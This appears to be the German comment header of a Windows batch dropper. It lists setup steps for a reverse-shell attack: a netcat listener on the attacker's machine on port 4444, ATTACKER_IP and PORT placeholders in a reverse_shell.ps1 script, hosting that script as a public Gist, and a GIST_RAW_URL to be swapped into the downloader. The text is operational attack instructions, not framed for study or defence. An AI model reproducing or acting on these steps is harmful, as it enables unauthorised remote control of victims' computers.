REM    1. nc -lvp 4444  (Listener auf Angreifer-Maschine)
REM    2. ATTACKER_IP und PORT in reverse_shell.ps1 eintragen
REM    3. reverse_shell.ps1 als öffentliches Gist hochladen
REM    4. GIST_RAW_URL unten ersetzen
